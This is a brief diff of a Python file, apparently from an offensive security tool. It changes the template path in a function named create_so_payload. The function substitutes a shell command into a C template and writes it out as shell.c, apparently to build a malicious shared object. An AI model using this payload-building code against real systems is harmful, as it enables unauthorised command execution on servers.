@@ -11,7 +11,7 @@ import logging
 
 def create_so_payload(cmd="id"):
     
-    code = open("./lib/template.c", 'r').read()
+    code = open("./template/template.c", 'r').read()
     payload = code.replace("<PAYLOAD>", cmd)
     with open('./shell.c', 'w') as f:
         f.write(payload)
